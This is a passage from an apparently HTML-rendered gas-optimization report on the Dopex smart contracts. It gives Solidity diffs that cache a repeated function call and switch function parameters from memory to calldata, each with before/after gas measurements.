class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">563</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">564:    </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">565:    </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">566:    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">567:  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">568</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">genesis</span><span class=\"mtk1\"> + (</span><span class=\"mtk12\">latestFundingPaymentPointer</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">fundingDuration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">569</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<p>Every time we call this function, we end up making 3 state reads, which can be quite expensive. We should refactor the code as follows to only call this function once, ie reading from state only once and caching the function result.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"113\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function _updateFundingRate(uint256 amount) private {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+     uint256 _nextFundingPaymentTimestamp = nextFundingPaymentTimestamp();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (fundingRates[latestFundingPaymentPointer] == 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       uint256 startTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      if (lastUpdateTime &gt; nextFundingPaymentTimestamp() - fundingDuration) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      if (lastUpdateTime &gt; _nextFundingPaymentTimestamp - fundingDuration) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         startTime = lastUpdateTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        startTime = nextFundingPaymentTimestamp() - fundingDuration;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        startTime = _nextFundingPaymentTimestamp - fundingDuration;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      uint256 endTime = nextFundingPaymentTimestamp();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       fundingRates[latestFundingPaymentPointer] =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         (amount * 1e18) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        (endTime - startTime);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        (_nextFundingPaymentTimestamp - startTime);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       uint256 startTime = lastUpdateTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      uint256 endTime = nextFundingPaymentTimestamp();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      if (endTime == startTime) return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      if (_nextFundingPaymentTimestamp == startTime) return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       fundingRates[latestFundingPaymentPointer] =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         fundingRates[latestFundingPaymentPointer] +</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        ((amount * 1e18) / (endTime - startTime));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        ((amount * 1e18) / (_nextFundingPaymentTimestamp - startTime));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h2 id=\"g-05-use-calldata-instead-of-memory-for-function-parameters\" style=\"position:relative;\"><a href=\"#g-05-use-calldata-instead-of-memory-for-function-parameters\" aria-label=\"g 05 use calldata instead of memory for function parameters permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] Use calldata instead of memory for function parameters</h2>\n<p>If a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory. Calldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory.</p>\n<p>Note that I’ve also flagged instances where the function is public but can be marked as external since it’s not called by the contract, and cases where a constructor is involved.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L240-L243\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L240-L243</a></p>\n<h3 id=\"use-calldata-for-_assetsymbol-save-318-gas-on-average\" style=\"position:relative;\"><a href=\"#use-calldata-for-_assetsymbol-save-318-gas-on-average\" aria-label=\"use calldata for _assetsymbol save 318 gas on average permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use calldata for <code>_assetSymbol</code> (Save 318 Gas on average)</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>96795</td>\n<td>104095</td>\n<td>97365</td>\n<td>118125</td>\n</tr>\n<tr>\n<td>After</td>\n<td>96477</td>\n<td>103777</td>\n<td>97047</td>\n<td>117807</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">240</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addAssetTotokenReserves</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">241:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">242:    </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_assetSymbol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">243</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DEFAULT_ADMIN_ROLE</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"115\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function addAssetTotokenReserves(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address _asset,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    string memory _assetSymbol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    string calldata _assetSymbol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ) external onlyRole(DEFAULT_ADMIN_ROLE) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     require(_asset != address(0), &quot;RdpxV2Core: asset cannot be 0 address&quot;);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L270-L272\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L270-L272</a></p>\n<h3 id=\"use-calldata-for-_assetsymbol\" style=\"position:relative;\"><a href=\"#use-calldata-for-_assetsymbol\" aria-label=\"use calldata for _assetsymbol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use calldata for <code>_assetSymbol</code></h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"116\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">270</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">removeAssetFromtokenReserves</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">271:    </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_assetSymbol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">272</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DEFAULT_ADMIN_ROLE</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"117\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function removeAssetFromtokenReserves(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    string memory _assetSymbol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    string calldata _assetSymbol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ) external onlyRole(DEFAULT_ADMIN_ROLE) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L764-L766\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L764-L766</a></p>\n<h3 id=\"use-calldata-for-optionids-save-646-gas-on-average\" style=\"position:relative;\"><a href=\"#use-calldata-for-optionids-save-646-gas-on-average\" aria-label=\"use calldata for optionids save 646 gas on average permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use calldata for <code>optionIds</code> (Save 646 Gas on average)</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>19746</td>\n<td>64123</td>\n<td>42398</td>\n<td>136328</td>\n</tr>\n<tr>\n<td>After</td>\n<td>19070</td>\n<td>63477</td>\n<td>41831</td>\n<td>135036</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"118\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">764</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">settle</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">765:    </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">optionIds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">766</span><span class=\"mtk1\">:  )</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"119\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function settle(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256[] memory optionIds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256[] calldata optionIds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   )</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L819-L824\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L819-L824</a></p>\n<h3 id=\"change-to-external-and-use-calldata-for-_amounts-and-_delegateids-save-768-gas-on-average\" style=\"position:relative;\"><a href=\"#change-to-external-and-use-calldata-for-_amounts-and-_delegateids-save-768-gas-on-average\" aria-label=\"change to external and use calldata for _amounts and _delegateids save 768 gas on average permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Change to external and use calldata for <code>_amounts</code> and <code>_delegateIds</code> (Save 768 Gas on average)</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>2159</td>\n<td>847375</td>\n<td>1092279</td>\n<td>1705471</td>\n</tr>\n<tr>\n<td>After</td>\n<td>1584</td>\n<td>846607</td>\n<td>1091594</td>\n<td>1704182</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"120\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">819</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bondWithDelegate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">820:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">821:    </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_amounts</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">822:    </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_delegateIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">823:    </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">rdpxBondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">824</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiptTokenAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"121\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function bondWithDelegate(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address _to,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256[] memory _amounts,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256[] memory _delegateIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256[] calldata _amounts,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256[] calldata _delegateIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 rdpxBondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ) public returns (uint256 receiptTokenAmount, uint256[] memory) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1135-L1137\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1135-L1137</a></p>\n<h3 id=\"change-to-external-and-use-calldata-on-_token-save-536-gas-on-average\" style=\"position:relative;\"><a href=\"#change-to-external-and-use-calldata-on-_token-save-536-gas-on-average\" aria-label=\"change to external and use calldata on _token save 536 gas on average permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Change to external and use calldata on <code>_token</code> (Save 536 Gas on average)</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>3699</td>\n<td>5099</td>\n<td>3699</td>\n<td>13699</td>\n</tr>\n<tr>\n<td>After</td>\n<td>3163</td>\n<td>4563</td>\n<td>3163</td>\n<td>13163</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"122\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1135</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getReserveTokenInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">1136:    </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1137</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"123\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function getReserveTokenInfo(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    string memory _token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    string calldata _token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ) public view returns (address, uint256, string memory) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L315-L317\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L315-L317</a></p>\n<h3 id=\"use-calldata-for-optionids-save-596-gas-on-average\" style=\"position:relative;\"><a href=\"#use-calldata-for-optionids-save-596-gas-on-average\" aria-label=\"use calldata for optionids save 596 gas on average permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use calldata for <code>optionIds</code> (Save 596 Gas on average)</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>17113</td>\n<td>60186</td>\n<td>56770</td>\n<td>127485</td>\n</tr>\n<tr>\n<td>After</td>\n<td>16897</td>\n<td>59890</td>\n<td>56420</td>\n<td>126616</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" 